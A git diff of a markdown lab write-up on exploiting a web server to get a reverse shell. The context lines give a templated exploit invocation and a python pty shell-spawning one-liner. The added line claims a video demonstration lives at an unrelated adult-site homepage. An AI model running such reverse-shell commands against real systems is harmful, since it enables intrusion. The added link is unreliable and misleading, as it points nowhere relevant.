@@ -127,9 +127,9 @@ Response 200 is a HTTP/1.1 response which states that the request has succeeded.
 3. Next test, the reverse shell exploitation.<br><br> 
 By typing “python <exploit>.py -t http://<ubuntu ip>/ -l <localhost> -p <port>” we can get a reverse shell separately in another terminal. I used python -c "import pty;pty.spawn('/bin/bash')" to get the shell and tested with pwd command.
   ![12](https://user-images.githubusercontent.com/37071700/81485141-8abb3480-9268-11ea-9107-43b8da283e18.png)<br><br>
-  ![13](https://user-images.githubusercontent.com/37071700/81485150-8d1d8e80-9268-11ea-8251-2251af52f91a.png)
+  ![13](https://user-images.githubusercontent.com/37071700/81485150-8d1d8e80-9268-11ea-8251-2251af52f91a.png)<br><br>
 
-
+A video demonstration is available in : https://www.pornhub.com/
 
 
 
